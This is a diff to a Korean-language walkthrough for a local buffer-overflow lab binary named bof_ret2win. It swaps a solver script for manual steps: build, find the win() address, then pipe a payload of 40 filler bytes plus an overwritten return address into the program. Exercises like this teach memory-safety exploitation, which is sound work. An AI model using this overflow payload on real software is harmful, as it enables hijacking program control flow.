@@ -17,10 +17,18 @@ void vulnerable_function() {
 
 ---
 
-## 3. 공략법
+## 3. 공략법 (직접 수행)
 ```bash
-python3 solve.py
+make
+./bof_ret2win        # 실행 시 출력되는 win() 주소를 확인
+# 또는:  objdump -d ./bof_ret2win | grep '<win>:'
 ```
+확인한 `win()` 주소로 페이로드를 구성해 전달합니다 (win 주소는 빌드마다 다를 수 있으니 하드코딩 금지):
+```bash
+python3 -c "import sys,struct; win=0x4011b6; \
+sys.stdout.buffer.write(b'A'*40 + struct.pack('<Q', win))" | ./bof_ret2win
+```
+> `win` 값을 방금 확인한 본인 빌드의 주소로 바꾸세요.
 
 ---
 
